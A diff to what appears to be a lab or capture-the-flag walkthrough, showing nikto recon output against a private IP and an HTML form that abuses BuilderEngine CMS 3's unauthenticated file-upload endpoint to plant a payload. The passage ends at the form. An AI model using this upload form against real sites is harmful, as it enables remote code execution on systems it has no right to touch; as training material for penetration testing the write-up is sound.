@@ -100,4 +100,44 @@ HOP RTT     ADDRESS
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 24.76 seconds
 ```
-While running a nikto scan I decided to check the page source for ip:80 and robots.txt.
+While running a nikto scan I decided to check the page source for ip:80 and ip:8080 and robots.txt. IP:8080 gives us information that its run on apache tomcat7 but nothing more could be found after further snooping.
+```
+└─$ nikto -host 192.168.1.127 
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.1.127
++ Target Hostname:    192.168.1.127
++ Target Port:        80
++ Start Time:         2023-03-05 17:23:06 (GMT4)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.7 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ "robots.txt" contains 1 entry which should be manually viewed.
++ Server may leak inodes via ETags, header found with file /, inode: 65, size: 53fb059bb5bc8, mtime: gzip
++ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS 
++ OSVDB-3268: /files/: Directory indexing found.
++ OSVDB-3092: /files/: This might be interesting...
++ OSVDB-3092: /system/: This might be interesting...
++ OSVDB-3233: /icons/README: Apache default file found.
++ OSVDB-3092: /license.txt: License file found may identify site software.
++ 7920 requests: 0 error(s) and 12 item(s) reported on remote host
++ End Time:           2023-03-05 17:28:33 (GMT4) (327 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+```
+Going to /license.txt reveals that webapp using the BuilderEngine CMS but no version is given. Further digging in the /themes found using dirb I found a 'description.txt' file which says it runs version 3. A quick search on exploitdb reveals a RCE on the version which allows us to create a file uploader which we can use to upload a payload. We create the following html file next.
+```
+<html>
+<body>
+<form method="post" action="http://localhost/themes/dashboard/assets/plugins/jquery-file-upload/server/php/" enctype="multipart/form-data">
+	<input type="file" name="files[]" />
+	<input type="submit" value="send" />
+</form>
+</body>
+</html>
+```
